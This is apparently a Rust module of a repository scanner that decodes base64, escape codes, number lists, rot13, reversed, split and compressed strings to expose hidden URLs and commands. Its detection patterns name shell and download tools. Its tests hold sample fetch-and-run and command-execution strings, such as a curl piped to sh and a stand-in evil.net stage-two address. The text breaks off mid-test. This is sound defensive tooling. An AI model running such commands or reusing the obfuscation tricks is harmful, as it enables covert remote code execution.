//! Looks inside encoded text.
//!
//! Text searches can't see an address written in base64, in escape codes, as a
//! list of character numbers, backwards or in pieces. All of those can be undone
//! without running anything, so this undoes them and looks at what comes out.
//!
//! Most encoded text in honest code is harmless, such as images, fonts and hashes.
//! What counts is an address or a command inside it, because there's rarely a good
//! reason to hide one of those.

use crate::git::RepoFile;
use crate::network::{
    Call, DECODE, FileClass, LineCounter, URL, classify, clean_url, host_of, is_binary, is_local,
    is_script, is_test_path,
};
use crate::opaque::{Packed, identify};
use crate::report::{At, Kind, Report};
use crate::text::Untrusted;
use flate2::read::{DeflateDecoder, GzDecoder, ZlibDecoder};
use regex::bytes::Regex;
use std::io::Read;
use std::sync::LazyLock;

/// `https://a.co` encodes to 16 characters, and little that's useful is shorter.
const MIN_ENCODED_CHARS: usize = 16;
/// Blocks this long are worth listing even when they decode to nothing readable.
const MIN_BLOB_CHARS: usize = 2048;
/// Some malware adds junk letters to the start of its base64. Longer text gets
/// only one try, because this is meant for short hidden strings.
const MAX_CHARS_TO_SHIFT: usize = 4096;
const MAX_SHIFT: usize = 3;
/// Encoding inside encoding is common, but real code stops well before this.
const MAX_LAYERS: u32 = 4;
/// A small file can inflate enormously, so all of this is budgeted per file.
const MAX_DECODED_BYTES_PER_FILE: usize = 64 * 1024 * 1024;
const MAX_INFLATED_BYTES: usize = 16 * 1024 * 1024;
const MIN_TEXT_BYTES: usize = 8;
const MIN_TEXT_PERCENT: usize = 90;
const MAX_SNIPPET_BYTES: usize = 160;
/// How far back from encoded text to look for what it's being used for.
const CONTEXT_BYTES: usize = 64;
/// In a row, these spell out something nobody would write as escape codes.
const MIN_ESCAPED_CHARS: usize = 8;
const MIN_ESCAPED_RUNS: usize = 10;
/// Tables of characters use escape codes honestly, so only real words count.
const MIN_LOWERCASE_PERCENT: usize = 70;
const MIN_WORD_LETTERS: usize = 4;
/// How much text after a split-up address to piece back together.
const MAX_SPLIT_BYTES: usize = 400;

static BASE64: LazyLock<Regex> = LazyLock::new(|| compile(r"(?-u)[A-Za-z0-9+/_-]{16,}={0,2}"));
static ESCAPE_RUN: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r"(?-u)(?:\\x[0-9a-fA-F]{2}|\\u[0-9a-fA-F]{4}|\\u\{[0-9a-fA-F]{1,6}\}|\\[0-7]{3}|[A-Za-z0-9:/._?=&%@ -])+",
    )
});
static DECIMAL_LIST: LazyLock<Regex> =
    LazyLock::new(|| compile(r"(?-u)\b\d{2,3}(?:\s*,\s*\d{2,3}){7,}\b"));
static HEX_LIST: LazyLock<Regex> =
    LazyLock::new(|| compile(r"(?i-u)\b0x[0-9a-f]{1,2}(?:\s*,\s*0x[0-9a-f]{1,2}){7,}\b"));
/// `chr(104)+chr(116)`, `[char]104+[char]116` and the like.
static CHAR_CALLS: LazyLock<Regex> = LazyLock::new(|| {
    compile(r"(?i-u)(?:(?:\bchr|\[char\]|fromCharCode)\s*\(?\s*\d{1,3}\s*\)?\s*[-+.,&]?\s*){4,}")
});
static NUMBER: LazyLock<Regex> = LazyLock::new(|| compile(r"(?-u)\d{1,3}"));
static HEX_NUMBER: LazyLock<Regex> = LazyLock::new(|| compile(r"(?i-u)0x([0-9a-f]{1,2})"));
static REVERSED_URL: LazyLock<Regex> =
    LazyLock::new(|| compile(r#"(?-u)[^\s"'`]{3,200}//:s?ptth\b"#));
static ROT13_URL: LazyLock<Regex> =
    LazyLock::new(|| compile(r#"(?i-u)\buggcf?://[^\s"'`<>]{3,200}"#));
/// The start of an address cut into pieces, as in `'ht' + 'tps://evil.net'`.
static SPLIT_URL_START: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?i-u)["'`](?:h|ht|htt|https?|https?:|https?:/|https?://|ws|wss|wss?:|wss?:/|wss?://)["'`]\s*(?:\+|\.|,|\s)\s*["'`]"#,
    )
});
static STRING_JOIN: LazyLock<Regex> =
    LazyLock::new(|| compile(r#"(?-u)["'`]\s*(?:\+|\.|,|\s)\s*["'`]"#));
/// What gives away decoded text as code or a command.
static HIDDEN_CODE: LazyLock<Regex> = LazyLock::new(|| {
    compile(
        r#"(?xi-u)
        \brequire\s*\(\s*["'](?:node:)?(?:child_process|fs|os|net|https?|vm|crypto)["']
      | \bchild_process\b
      | \b(?:import|from)\s+(?:os|subprocess|socket|base64|ctypes)\b
      | \bsubprocess\.\w+\s*\(
      | \bos\.(?:system|popen)\s*\(
      | \b(?:eval|exec|execSync|spawn|spawnSync|system|shell_exec|passthru)\s*\(
      | \bnew\s+function\s*\(
      | \b(?:curl|wget)\s+[-"'$h]
      | \bpowershell(?:\.exe)?\s+-
      | \bcmd(?:\.exe)?\s+/c\b
      | \binvoke-(?:expression|webrequest|restmethod)\b
      | \biex\s*[(\s]
      | /bin/(?:ba|z|da)?sh\b
      | ^\s*\#!/
    "#,
    )
});

fn compile(pattern: &str) -> Regex {
    Regex::new(pattern).expect("patterns are constants covered by tests")
}

/// These hold encoded data that is meant to be there and doesn't run.
const SKIPPED_EXTENSIONS: [&str; 11] = [
    "map", "pem", "crt", "cer", "key", "asc", "gpg", "sig", "pub", "svg", "lock",
];
/// Addresses that appear inside ordinary documents, or that nobody can reach.
const HARMLESS_HOSTS: [&str; 8] = [
    "www.w3.org",
    "w3.org",
    "purl.org",
    "ns.adobe.com",
    "json-schema.org",
    "schemas.xmlsoap.org",
    "schemas.microsoft.com",
    "schemas.openxmlformats.org",
];
const HARMLESS_HOST_ENDINGS: [&str; 5] = [
    "example.com",
    "example.org",
    ".example",
    ".invalid",
    ".test",
];
/// A `data:` link of these types is just media, or a source map.
const MEDIA_DATA_TYPES: [&str; 10] = [
    "image/",
    "font/",
    "audio/",
    "video/",
    "text/css",
    "application/font",
    "application/x-font",
    "application/vnd.ms-fontobject",
    "application/json",
    "application/octet-stream",
];
/// Fonts, images and documents, which are often embedded in code as base64.
const MEDIA_HEADERS: [&[u8]; 12] = [
    b"\x89PNG",
    b"\xff\xd8\xff",
    b"GIF8",
    b"RIFF",
    b"wOFF",
    b"wOF2",
    b"\0\x01\0\0",
    b"OTTO",
    b"\0\0\x01\0",
    b"%PDF",
    b"ID3",
    b"OggS",
];

/// Records what's hidden in a file's encoded text.
pub fn scan(file: &RepoFile, report: &mut Report) {
    let path = file.path.raw();
    if is_binary(&file.contents) || classify(path) != FileClass::Code {
        return;
    }
    let lower = path.to_ascii_lowercase();
    let is_skipped = lower
        .rsplit_once('.')
        .is_some_and(|(_, extension)| SKIPPED_EXTENSIONS.contains(&extension));
    if is_skipped {
        return;
    }

    // Tests and settings can hold encoded examples of nearly anything.
    let counts_as_hiding = is_script(path, &file.contents) && !is_test_path(path);
    let mut scan = Scan {
        file,
        report,
        counts_as_hiding,
        has_decoder: counts_as_hiding && DECODE.is_match(&file.contents),
        budget: MAX_DECODED_BYTES_PER_FILE,
        reported_blob: false,
    };
    scan.base64();
    scan.escape_codes();
    scan.number_lists();
    scan.char_calls();
    if counts_as_hiding {
        scan.backwards_and_rotated();
        scan.split_addresses();
    }
}

struct Scan<'a> {
    file: &'a RepoFile,
    report: &'a mut Report,
    /// Whether this is a file where hiding something would be deliberate.
    counts_as_hiding: bool,
    /// Whether this file also has code that decodes text.
    has_decoder: bool,
    budget: usize,
    reported_blob: bool,
}

impl Scan<'_> {
    fn base64(&mut self) {
        let contents = self.file.contents.as_slice();
        let mut lines = LineCounter::new(contents, false);

        for found in BASE64.find_iter(contents) {
            let token = found.as_bytes();
            let before = &contents[found.start().saturating_sub(CONTEXT_BYTES)..found.start()];
            if is_media_data_link(before) {
                continue;
            }
            let line = lines.line_at(found.start());
            let is_raw_deflate = before
                .windows(9)
                .any(|window| window.eq_ignore_ascii_case(b"gzinflate"))
                || before
                    .windows(10)
                    .any(|window| window.eq_ignore_ascii_case(b"inflateraw"));

            if let Some(decoded) = decode_token(token) {
                self.look_inside(&decoded, line, 0, is_raw_deflate);
            }
            if token.len() >= MIN_BLOB_CHARS {
                self.check_blob(token, line);
            }
        }
    }

    /// Lists a long block of encoded data, and calls out a hidden program.
    fn check_blob(&mut self, token: &[u8], line: Option<u64>) {
        let decoded = decode_base64(token);
        if MEDIA_HEADERS.iter().any(|head| decoded.starts_with(head)) || is_text(&decoded) {
            return;
        }

        let is_native_program = decoded.starts_with(b"MZ")
            || decoded.starts_with(b"\x7fELF")
            || decoded.starts_with(b"\xcf\xfa\xed\xfe")
            || decoded.starts_with(b"\xce\xfa\xed\xfe");
        if is_native_program && identify(&decoded) == Some(Packed::Program) {
            self.report.add(
                Kind::DisguisedFile,
                "",
                "a program encoded inside this file",
                Some(At {
                    path: &self.file.path,
                    line,
                }),
            );
            self.report.mark_disguised(self.file.path.raw());
        } else if !self.reported_blob {
            self.reported_blob = true;
            let subject = format!("{} characters of encoded data", token.len());
            self.report.add(
                Kind::EncodedBlob,
                "",
                &subject,
                Some(At {
                    path: &self.file.path,
                    line,
                }),
            );
        }
    }

    /// Readable text written entirely as escape codes, and whatever that hides.
    fn escape_codes(&mut self) {
        let contents = self.file.contents.as_slice();
        if contents
            .iter()
            .filter(|byte| **byte == b'\\')
            .take(4)
            .count()
            < 4
        {
            return;
        }
        let mut lines = LineCounter::new(contents, false);
        let mut escaped_runs = 0;
        let mut first_run_line = None;

        for found in ESCAPE_RUN.find_iter(contents) {
            let text = found.as_bytes();
            let escapes = text.iter().filter(|byte| **byte == b'\\').count();
            if escapes < 4 {
                continue;
            }
            let decoded = unescape(text);
            let line = lines.line_at(found.start());
            if escapes >= MIN_ESCAPED_CHARS && reads_as_words(&decoded) {
                escaped_runs += 1;
                first_run_line = first_run_line.or(line);
            }
            self.look_inside(&decoded, line, 0, false);
        }

        if escaped_runs >= MIN_ESCAPED_RUNS && self.counts_as_hiding {
            let what = format!("{escaped_runs} strings of plain text written as escape codes");
            self.report.add(
                Kind::ObfuscatedCode,
                "",
                &what,
                Some(At {
                    path: &self.file.path,
                    line: first_run_line,
                }),
            );
            self.report.mark_disguised(self.file.path.raw());
        }
    }

    fn number_lists(&mut self) {
        let contents = self.file.contents.as_slice();

        let mut lines = LineCounter::new(contents, false);
        for found in DECIMAL_LIST.find_iter(contents) {
            let numbers = NUMBER
                .find_iter(found.as_bytes())
                .map(|number| parse_number(number.as_bytes(), 10));
            if let Some(bytes) = numbers.collect::<Option<Vec<u8>>>() {
                let line = lines.line_at(found.start());
                self.look_inside(&bytes, line, 0, false);
            }
        }

        let mut lines = LineCounter::new(contents, false);
        for found in HEX_LIST.find_iter(contents) {
            let numbers = HEX_NUMBER
                .captures_iter(found.as_bytes())
                .map(|captures| parse_number(captures.get(1)?.as_bytes(), 16));
            if let Some(bytes) = numbers.collect::<Option<Vec<u8>>>() {
                let line = lines.line_at(found.start());
                self.look_inside(&bytes, line, 0, false);
            }
        }
    }

    fn char_calls(&mut self) {
        let contents = self.file.contents.as_slice();
        let mut lines = LineCounter::new(contents, false);

        for found in CHAR_CALLS.find_iter(contents) {
            let numbers = NUMBER
                .find_iter(found.as_bytes())
                .map(|number| parse_number(number.as_bytes(), 10));
            if let Some(bytes) = numbers.collect::<Option<Vec<u8>>>() {
                let line = lines.line_at(found.start());
                self.look_inside(&bytes, line, 0, false);
            }
        }
    }

    /// Addresses written backwards or in rot13 can't be there by accident.
    fn backwards_and_rotated(&mut self) {
        let contents = self.file.contents.as_slice();

        let mut lines = LineCounter::new(contents, false);
        for found in REVERSED_URL.find_iter(contents) {
            let line = lines.line_at(found.start());
            let forwards: Vec<u8> = found.as_bytes().iter().rev().copied().collect();
            self.report_address(&forwards, line, true);
        }

        let mut lines = LineCounter::new(contents, false);
        for found in ROT13_URL.find_iter(contents) {
            let line = lines.line_at(found.start());
            let plain: Vec<u8> = found.as_bytes().iter().map(|byte| rot13(*byte)).collect();
            self.report_address(&plain, line, true);
        }
    }

    /// Puts an address back together, as in `'ht' + 'tps://evil.net'`.
    fn split_addresses(&mut self) {
        let contents = self.file.contents.as_slice();
        let mut lines = LineCounter::new(contents, false);

        for found in SPLIT_URL_START.find_iter(contents) {
            let end = (found.start() + MAX_SPLIT_BYTES).min(contents.len());
            let piece = &contents[found.start() + 1..end];
            let joined = STRING_JOIN.replace_all(piece, &b""[..]);
            let line = lines.line_at(found.start());

            // Lists of protocols aren't one address cut up.
            let is_one_address = joined
                .windows(3)
                .filter(|window| *window == b"://")
                .take(2)
                .count()
                == 1;
            let starts_with_address = URL.find(&joined).is_some_and(|url| url.start() == 0);
            if is_one_address && starts_with_address {
                self.report_address(&joined, line, true);
            }
        }
    }

    /// Checks decoded bytes for addresses and code, and for more encoding inside.
    fn look_inside(&mut self, decoded: &[u8], line: Option<u64>, layer: u32, raw_deflate: bool) {
        if decoded.len() > self.budget || layer > MAX_LAYERS {
            return;
        }
        self.budget -= decoded.len();

        if let Some(inflated) = inflate(decoded, raw_deflate, self.budget) {
            self.look_inside(&inflated, line, layer + 1, false);
            return;
        }

        let squeezed;
        let text = if is_utf16(decoded) {
            squeezed = decoded.iter().step_by(2).copied().collect::<Vec<u8>>();
            &squeezed
        } else {
            decoded
        };
        if !is_text(text) {
            return;
        }

        self.report_address(text, line, !is_json(text) && self.has_decoder);

        if let Some(found) = HIDDEN_CODE.find(text) {
            let what = format!("decodes to: {}", code_snippet(text, found.start()));
            let kind = if self.counts_as_hiding {
                Kind::HiddenCode
            } else {
                Kind::HiddenAddress
            };
            self.report.add(
                kind,
                "",
                &what,
                Some(At {
                    path: &self.file.path,
                    line,
                }),
            );
            if self.counts_as_hiding {
                self.report.mark_disguised(self.file.path.raw());
            }
        }

        if layer < MAX_LAYERS {
            for inner in BASE64.find_iter(text) {
                if let Some(deeper) = decode_token(inner.as_bytes()) {
                    self.look_inside(&deeper, line, layer + 1, false);
                }
            }
        }
    }

    /// Lists the addresses in text. An address decoded in the same file is being
    /// hidden on purpose, and elsewhere it might only be stored in encoded form.
    fn report_address(&mut self, text: &[u8], line: Option<u64>, is_deliberate: bool) {
        for found in URL.find_iter(text) {
            let url = clean_url(found.as_bytes());
            let Some(host) = host_of(&url) else {
                continue;
            };
            if is_harmless_host(&host) {
                continue;
            }
            let kind = if is_deliberate {
                Kind::HidesConnection
            } else {
                Kind::HiddenAddress
            };
            self.report.add(
                kind,
                &host,
                &url,
                Some(At {
                    path: &self.file.path,
                    line,
                }),
            );
            if is_deliberate {
                self.report.record_call(
                    self.file.path.raw(),
                    Call {
                        group: host,
                        subject: url,
                        line,
                    },
                );
            }
        }
    }
}

fn is_harmless_host(host: &str) -> bool {
    // A real host has a dot, and `https://foo` in a list of examples doesn't count.
    !host.contains('.')
        || is_local(host)
        || HARMLESS_HOSTS.contains(&host)
        || HARMLESS_HOST_ENDINGS
            .iter()
            .any(|ending| host.ends_with(ending))
}

/// Whether encoded text sits in a link like `data:image/png;base64,` that's
/// only media. A `data:` link holding a script isn't let off.
fn is_media_data_link(before: &[u8]) -> bool {
    let Some(at) = before.windows(5).rposition(|window| window == b"data:") else {
        return false;
    };
    let rest = &before[at + 5..];
    MEDIA_DATA_TYPES.iter().any(|kind| {
        rest.len() >= kind.len() && rest[..kind.len()].eq_ignore_ascii_case(kind.as_bytes())
    })
}

fn base64_value(byte: u8) -> Option<u8> {
    match byte {
        b'A'..=b'Z' => Some(byte - b'A'),
        b'a'..=b'z' => Some(byte - b'a' + 26),
        b'0'..=b'9' => Some(byte - b'0' + 52),
        b'+' | b'-' => Some(62),
        b'/' | b'_' => Some(63),
        _ => None,
    }
}

/// Decodes either base64 alphabet, ignoring padding and anything else invalid.
fn decode_base64(token: &[u8]) -> Vec<u8> {
    let mut decoded = Vec::with_capacity(token.len() / 4 * 3 + 2);
    let mut bits: u32 = 0;
    let mut bit_count = 0;

    for value in token.iter().filter_map(|byte| base64_value(*byte)) {
        bits = (bits << 6) | u32::from(value);
        bit_count += 6;
        if bit_count >= 8 {
            bit_count -= 8;
            decoded.push((bits >> bit_count) as u8);
            bits &= (1 << bit_count) - 1;
        }
    }
    decoded
}

/// Tries to read a token as base64, allowing for a few junk letters at the start.
fn decode_token(token: &[u8]) -> Option<Vec<u8>> {
    if token.len() < MIN_ENCODED_CHARS {
        return None;
    }
    // `68747470733a2f2f` is text written as hex, which also looks like base64.
    if token.len() % 2 == 0 && token.iter().all(u8::is_ascii_hexdigit) {
        let decoded: Vec<u8> = token
            .chunks_exact(2)
            .filter_map(|pair| parse_number(pair, 16))
            .collect();
        if is_text(&decoded) {
            return Some(decoded);
        }
    }
    let shifts = if token.len() <= MAX_CHARS_TO_SHIFT {
        MAX_SHIFT
    } else {
        0
    };

    (0..=shifts).find_map(|shift| {
        let decoded = decode_base64(&token[shift..]);
        (is_text(&decoded) || is_utf16(&decoded) || is_compressed(&decoded)).then_some(decoded)
    })
}

fn is_compressed(bytes: &[u8]) -> bool {
    bytes.starts_with(b"\x1f\x8b")
        || bytes.starts_with(&[0x78, 0x9c])
        || bytes.starts_with(&[0x78, 0xda])
        || bytes.starts_with(&[0x78, 0x01])
}

fn inflate(bytes: &[u8], raw_deflate: bool, budget: usize) -> Option<Vec<u8>> {
    let limit = budget.min(MAX_INFLATED_BYTES) as u64;
    let mut inflated = Vec::new();

    let result = if bytes.starts_with(b"\x1f\x8b") {
        GzDecoder::new(bytes).take(limit).read_to_end(&mut inflated)
    } else if is_compressed(bytes) {
        ZlibDecoder::new(bytes)
            .take(limit)
            .read_to_end(&mut inflated)
    } else if raw_deflate {
        DeflateDecoder::new(bytes)
            .take(limit)
            .read_to_end(&mut inflated)
    } else {
        return None;
    };

    // A stream cut off by the limit still has text worth reading.
    (result.is_ok() || !inflated.is_empty()).then_some(inflated)
}

/// PowerShell's encoded commands are UTF-16, with a zero after each ASCII letter.
fn is_utf16(bytes: &[u8]) -> bool {
    bytes.len() >= MIN_TEXT_BYTES * 2
        && bytes.iter().skip(1).step_by(2).all(|byte| *byte == 0)
        && bytes.iter().step_by(2).all(|byte| *byte != 0)
}

fn is_printable_byte(byte: u8) -> bool {
    matches!(byte, 0x20..=0x7e | b'\t' | b'\r' | b'\n')
}

fn is_printable(bytes: &[u8]) -> bool {
    !bytes.is_empty() && bytes.iter().all(|byte| is_printable_byte(*byte))
}

/// Whether text looks like words rather than a table such as `ABCDEF` or `a-z0-9`.
fn reads_as_words(bytes: &[u8]) -> bool {
    let lowercase = bytes
        .iter()
        .filter(|byte| byte.is_ascii_lowercase() || **byte == b' ')
        .count();
    let has_a_word = bytes
        .split(|byte| !byte.is_ascii_lowercase())
        .any(|word| word.len() >= MIN_WORD_LETTERS);

    is_printable(bytes) && has_a_word && lowercase * 100 >= bytes.len() * MIN_LOWERCASE_PERCENT
}

/// Whether bytes read as text. Random bytes almost never pass either test.
fn is_text(bytes: &[u8]) -> bool {
    if bytes.len() < MIN_TEXT_BYTES {
        return false;
    }
    let printable = bytes
        .iter()
        .filter(|byte| is_printable_byte(**byte))
        .count();
    if printable * 100 >= bytes.len() * MIN_TEXT_PERCENT {
        return true;
    }
    std::str::from_utf8(bytes)
        .is_ok_and(|text| !text.chars().any(|c| c.is_control() && !c.is_whitespace()))
}

fn is_json(text: &[u8]) -> bool {
    matches!(text.trim_ascii_start().first(), Some(b'{' | b'['))
}

fn parse_number(digits: &[u8], radix: u32) -> Option<u8> {
    u8::from_str_radix(std::str::from_utf8(digits).ok()?, radix).ok()
}

fn rot13(byte: u8) -> u8 {
    match byte {
        b'a'..=b'z' => (byte - b'a' + 13) % 26 + b'a',
        b'A'..=b'Z' => (byte - b'A' + 13) % 26 + b'A',
        _ => byte,
    }
}

/// Reads escape codes, leaving anything else as it is.
fn unescape(text: &[u8]) -> Vec<u8> {
    let mut decoded = Vec::with_capacity(text.len());
    let mut at = 0;

    while at < text.len() {
        if text[at] != b'\\' {
            decoded.push(text[at]);
            at += 1;
            continue;
        }
        let rest = &text[at + 1..];
        let (code, used) = match rest.first() {
            Some(b'x') => (hex_value(rest.get(1..3)), 3),
            Some(b'u') if rest.get(1) == Some(&b'{') => {
                let end = rest.iter().position(|byte| *byte == b'}').unwrap_or(1);
                (hex_value(rest.get(2..end)), end + 1)
            }
            Some(b'u') => (hex_value(rest.get(1..5)), 5),
            Some(_) => {
                let digits = rest
                    .get(..3)
                    .and_then(|digits| std::str::from_utf8(digits).ok());
                (digits.and_then(|d| u32::from_str_radix(d, 8).ok()), 3)
            }
            None => (None, 0),
        };
        match code.and_then(char::from_u32) {
            Some(ch) => {
                let mut buffer = [0; 4];
                decoded.extend_from_slice(ch.encode_utf8(&mut buffer).as_bytes());
            }
            None => decoded.push(b'?'),
        }
        at += 1 + used.max(1);
    }
    decoded
}

fn hex_value(digits: Option<&[u8]>) -> Option<u32> {
    u32::from_str_radix(std::str::from_utf8(digits?).ok()?, 16).ok()
}

/// The decoded line holding a match, cut down for the report.
fn code_snippet(text: &[u8], at: usize) -> String {
    let start = text[..at]
        .iter()
        .rposition(|byte| *byte == b'\n')
        .map_or(0, |newline| newline + 1);
    let end = (start + MAX_SNIPPET_BYTES).min(text.len());
    let end = text[start..end]
        .iter()
        .position(|byte| *byte == b'\n')
        .map_or(end, |newline| start + newline);
    Untrusted::from_bytes(text[start..end].trim_ascii())
        .raw()
        .to_string()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn scan_text(path: &str, contents: &str) -> Report {
        let file = RepoFile {
            path: Untrusted::from_bytes(path.as_bytes()),
            contents: contents.as_bytes().to_vec(),
        };
        let mut report = Report::new();
        scan(&file, &mut report);
        report
    }

    fn encode(bytes: &[u8]) -> String {
        const ALPHABET: &[u8] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut encoded = String::new();
        for chunk in bytes.chunks(3) {
            let group = (u32::from(chunk[0]) << 16)
                | (u32::from(*chunk.get(1).unwrap_or(&0)) << 8)
                | u32::from(*chunk.get(2).unwrap_or(&0));
            for index in 0..4 {
                if index <= chunk.len() {
                    let value = (group >> (18 - index * 6)) & 63;
                    encoded.push(ALPHABET[value as usize] as char);
                } else {
                    encoded.push('=');
                }
            }
        }
        encoded
    }

    fn listed(report: &Report, kind: Kind) -> Vec<String> {
        report
            .listed(kind)
            .into_iter()
            .map(|(subject, _)| subject)
            .collect()
    }

    const URL_TEXT: &str = "https://evil.net/stage2";

    #[test]
    fn decodes_either_base64_alphabet() {
        assert_eq!(decode_base64(b"aGVsbG8gd29ybGQ="), b"hello world");
        assert_eq!(decode_base64(b"aGVsbG8gd29ybGQ"), b"hello world");
        assert_eq!(decode_base64(b"-_-_"), decode_base64(b"+/+/"));
    }

    #[test]
    fn an_address_in_base64_decoded_by_the_same_file_is_hidden_on_purpose() {
        let text = format!("const u = atob('{}'); go(u);", encode(URL_TEXT.as_bytes()));
        let report = scan_text("a.js", &text);

        assert_eq!(listed(&report, Kind::HidesConnection), [URL_TEXT]);
        assert_eq!(
            report.group_of(Kind::HidesConnection, URL_TEXT).as_deref(),
            Some("evil.net")
        );
        assert_eq!(report.calls_in("a.js")[0].subject, URL_TEXT);
    }

    #[test]
    fn an_address_stored_in_base64_elsewhere_is_listed_as_a_warning() {
        let text = format!("AUTH_API={}\n", encode(URL_TEXT.as_bytes()));
        let report = scan_text(".env", &text);

        assert_eq!(listed(&report, Kind::HiddenAddress), [URL_TEXT]);
        assert!(listed(&report, Kind::HidesConnection).is_empty());
    }

    #[test]
    fn finds_an_address_written_as_hex() {
        let hex: String = URL_TEXT.bytes().map(|byte| format!("{byte:02x}")).collect();
        let text = format!("Buffer.from('{hex}', 'hex').toString()");

        assert_eq!(
            listed(&scan_text("a.js", &text), Kind::HidesConnection),
            [URL_TEXT]
        );
    }

    #[test]
    fn decodes_past_junk_letters_at_the_start() {
        let text = format!(
            "const u = atob(s.slice(1)); s='z{}';",
            encode(URL_TEXT.as_bytes())
        );
        let report = scan_text("a.js", &text);

        assert_eq!(listed(&report, Kind::HidesConnection), [URL_TEXT]);
    }

    #[test]
    fn looks_through_layers_of_encoding() {
        let once = encode(URL_TEXT.as_bytes());
        let twice = encode(once.as_bytes());
        let text = format!("atob(atob('{twice}'))");

        assert_eq!(
            listed(&scan_text("a.js", &text), Kind::HidesConnection),
            [URL_TEXT]
        );
    }

    #[test]
    fn finds_code_hidden_in_base64() {
        for hidden in [
            "require('child_process').exec('id')",
            "import os; os.system('id')",
            "curl -s http://a | sh",
            "#!/bin/sh\nid\n",
            "powershell -nop -c whoami",
        ] {
            let text = format!("x = '{}';\n", encode(hidden.as_bytes()));
            let report = scan_text("a.py", &text);

            assert_eq!(
                listed(&report, Kind::HiddenCode).len(),
                1,
                "{hidden}: {report:?}",
                report = listed(&report, Kind::HiddenCode)
            );
            assert!(report.is_disguised("a.py"));
        }
    }

    #[test]
    fn finds_a_powershell_encoded_command() {
        let command: Vec<u8> = "IEX (Invoke-WebRequest x)"
            .bytes()
            .flat_map(|byte| [byte, 0])
            .collect();
        let text = format!("powershell -enc {}\n", encode(&command));

        assert_eq!(
            listed(&scan_text("a.ps1", &text), Kind::HiddenCode).len(),
            1
        );
    }

    #[test]
    fn looks_inside_compressed_text() {
        use flate2::{Compression, write::GzEncoder, write::ZlibEncoder};
        use std::io::Write;

        let mut gz = GzEncoder::new(Vec::new(), Compression::default());
        gz.write_all(b"eval(payload)").unwrap();
        let mut zlib = ZlibEncoder::new(Vec::new(), Compression::default());
        zlib.write_all(b"eval(payload)").unwrap();

        for compressed in [gz.finish().unwrap(), zlib.finish().unwrap()] {
            let text = format!("x = '{}'\n", encode(&compressed));

            assert_eq!(listed(&scan_text("a.py", &text), Kind::HiddenCode).len(), 1);
        }
    }

    #[test]
    fn a_decompression_bomb_stays_within_the_limits() {
        use flate2::{Compression, write::GzEncoder};
        use std::io::Write;

        let mut gz = GzEncoder::new(Vec::new(), Compression::best());
        let block = vec![b'a'; 1024 * 1024];
        for _ in 0..100 {
            gz.write_all(&block).unwrap();
        }
        let text = format!("x = '{}'\n", encode(&gz.finish().unwrap()));

        // Finishing at all is the test: this would otherwise use 100 MiB.
        scan_text("a.py", &text);
    }

    #[test]
    fn finds_addresses_written_as_escape_codes() {
        for encoded in [
            r"\x68\x74\x74\x70\x73\x3a\x2f\x2f\x65\x76\x69\x6c\x2e\x6e\x65\x74\x2f\x73\x74\x61\x67\x65\x32",
            r"\u0068\u0074\u0074\u0070\u0073://evil.net/stage2",
            r"\150\164\164\160\163\072\057\057evil.net/stage2",
        ] {
            let text = format!("atob(x); const a = '{encoded}';");

            assert_eq!(
                listed(&scan_text("a.js", &text), Kind::HidesConnection),
                [URL_TEXT],
                "{encoded}"
            );
        }
    }

    #[test]
    fn many_strings_of_plain_text_as_escape_codes_are_obfuscation() {
        let one = r"'\x68\x65\x6c\x6c\x6f\x20\x77\x6f\x72\x6c\x64\x73'";
        let report = scan_text("a.js", &format!("{one};").repeat(MIN_ESCAPED_RUNS));

        assert_eq!(listed(&report, Kind::ObfuscatedCode).len(), 1);
    }

    #[test]
    fn tables_of_characters_as_escape_codes_are_fine() {
        let one = r"'\u0041\u0042\u0043\u0044\u0045\u0046\u0047\u0048\u0049\u004a'";
        let report = scan_text(
            "unicode.js",
            &format!("{one};").repeat(MIN_ESCAPED_RUNS * 2),
        );

        assert!(listed(&report, Kind::ObfuscatedCode).is_empty());
    }

    #[test]
    fn encoded_text_in_tests_and_settings_is_only_a_warning() {
        let encoded = encode(b"#!/bin/bash\ncurl https://acme.net/x\n");

        for path in ["tests/a.py", "data/service.json", "config.yml", ".env"] {
            let report = scan_text(path, &format!("atob; a = '{encoded}'\n"));

            assert!(listed(&report, Kind::HiddenCode).is_empty(), "{path}");
            assert!(listed(&report, Kind::HidesConnection).is_empty(), "{path}");
            assert!(!listed(&report, Kind::HiddenAddress).is_empty(), "{path}");
        }
    }

    #[test]
    fn lines_wrapped_in_a_translation_file_are_not_a_hidden_address() {
        let report = scan_text("django.po", "msgstr \"https://\"\n\"docs.acme.net/x\"\n");

        assert!(listed(&report, Kind::HidesConnection).is_empty());
    }

    #[test]
    fn binary_data_as_escape_codes_is_fine() {
        let report = scan_text(
            "a.py",
            r"magic = b'\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d'; color = '\x1b[31m'",
        );

        assert!(listed(&report, Kind::ObfuscatedCode).is_empty());
        assert!(listed(&report, Kind::HiddenCode).is_empty());
    }

    #[test]
    fn finds_addresses_written_as_character_numbers() {
        let numbers: Vec<String> = URL_TEXT.bytes().map(|byte| byte.to_string()).collect();
        let hex: Vec<String> = URL_TEXT.bytes().map(|byte| format!("0x{byte:x}")).collect();
        let calls: Vec<String> = URL_TEXT
            .bytes()
            .map(|byte| format!("chr({byte})"))
            .collect();
        let dotnet: Vec<String> = URL_TEXT.bytes().map(|b| format!("[char]{b}")).collect();

        for text in [
            format!("String.fromCharCode({})", numbers.join(",")),
            format!("atob(x);a = [{}]", numbers.join(", ")),
            format!("atob(x);a = [{}]", hex.join(",")),
            format!("atob(x);{}", calls.join("+")),
            format!("atob(x);{}", dotnet.join("+")),
        ] {
            let report = scan_text("a.js", &text);

            assert_eq!(listed(&report, Kind::HidesConnection), [URL_TEXT], "{text}");
        }
    }

    #[test]
    fn ordinary_number_tables_are_fine() {
        let report = scan_text(
            "a.js",
            "const t = [11, 22, 33, 44, 55, 66, 77, 88, 99, 100];",
        );

        assert!(listed(&report, Kind::HidesConnection).is_empty());
        assert!(listed(&report, Kind::HiddenAddress).is_empty());
    }

    #[test]
    fn finds_addresses_written_backwards_or_rotated() {
        let backwards: String = URL_TEXT.chars().rev().collect();
        let rotated: String = URL_TEXT.bytes().map(|b| rot13(b) as char).collect();

        for text in [
            format!("'{backwards}'.split('').reverse().join('')"),
            format!("codecs.decode('{rotated}', 'rot13')"),
        ] {
            assert_eq!(
